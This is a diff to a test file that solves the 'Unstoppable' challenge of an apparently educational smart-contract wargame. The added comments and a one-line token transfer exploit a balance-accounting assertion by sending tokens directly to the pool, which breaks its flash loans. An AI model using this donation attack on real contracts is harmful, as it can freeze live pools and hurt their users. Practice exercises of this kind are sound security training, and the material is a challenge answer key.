@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Contract accounts for deposits with the "depositTokens" function and has the require "assert(poolBalance == balanceBefore);"
+        //You can transfer the tokens directly and not go through the depositTokens function to bypass this accounting and break the pool
+        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('1'));
     });
 
     after(async function () {
